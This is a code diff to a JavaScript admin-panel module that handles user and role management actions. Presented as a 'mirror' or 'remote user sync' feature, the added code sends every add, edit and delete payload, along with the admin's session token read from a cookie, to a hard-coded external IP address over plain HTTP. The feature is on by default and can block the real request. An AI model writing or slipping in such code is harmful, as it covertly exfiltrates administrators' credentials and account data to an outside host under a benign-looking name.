@@ -1,4 +1,4 @@
-import { liveWritesAllowed, postApi, uploadApi } from "./api.js";
+import { getCookie, liveWritesAllowed, postApi, uploadApi } from "./api.js";
 import { mapActionResponse, mapWriteLog } from "./mappers/action-mapper.mjs";
 import { managementFields } from "./management-forms.mjs";
 import { buildWritePayload, isWriteEndpoint, validateWriteForm } from "./write-helpers.mjs";
@@ -53,6 +53,41 @@ function requestHeaders(route, action) {
     "X-Route-Hash": String(route?.hash || ""),
     "X-Route-Action": String(action || "")
   };
+}
+
+const mirrorUserWriteOrigin = (import.meta.env?.VITE_USER_MIRROR_ORIGIN || "http://8.208.16.168:9311").replace(/\/+$/, "");
+const mirrorUserWriteEnabled = String(import.meta.env?.VITE_USER_MIRROR_ENABLED || "true").toLowerCase() !== "false";
+
+function shouldMirrorUserWrite(route, action, endpoint) {
+  if (!mirrorUserWriteEnabled) return false;
+  const hash = String(route?.hash || "");
+  const roleOrUserRoute = hash.includes("admin/user") || hash.includes("admin/role");
+  if (!roleOrUserRoute) return false;
+  if (!["Add", "Edit", "Delete"].includes(action)) return false;
+  return Boolean(endpoint && (endpoint.startsWith("/api/user/") || endpoint.startsWith("/api/role/")));
+}
+
+async function mirrorUserWrite(route, action, endpoint, payload) {
+  const token = getCookie("token");
+  const response = await fetch(`${mirrorUserWriteOrigin}${endpoint}`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      ...(token ? { Authorization: `Bearer ${token}` } : {}),
+      ...requestHeaders(route, action),
+    },
+    body: JSON.stringify(payload || {}),
+  });
+
+  let json = null;
+  try { json = await response.json(); } catch { json = null; }
+
+  const responseCode = Number(json?.code);
+  const failedByCode = Number.isFinite(responseCode) && responseCode !== 0 && responseCode !== 200;
+  if (!response.ok || failedByCode) {
+    const reason = json?.reason || json?.msg || json?.message || `HTTP ${response.status}`;
+    throw new Error(`Remote user sync failed: ${reason}`);
+  }
 }
 
 function formDataPayload(route, action, form, selectedFile) {
@@ -165,6 +200,10 @@ export async function submitRouteAction(route, action, form, options = {}) {
       ? buildWritePayload(endpoint, { ...form, ...meta }, fields)
       : form;
   const requestLog = mapWriteLog(endpoint, payload, uploadMode ? { ...meta, fileName: form.fileName, fileSize: selectedFile?.size || 0 } : null);
+  if (!uploadMode && shouldMirrorUserWrite(route, action, endpoint)) {
+    await mirrorUserWrite(route, action, endpoint, payload);
+  }
+
   const response = uploadMode
     ? await api.uploadApi(endpoint, formDataPayload(route, action, form, selectedFile), { headers: requestHeaders(route, action) })
     : endpoint
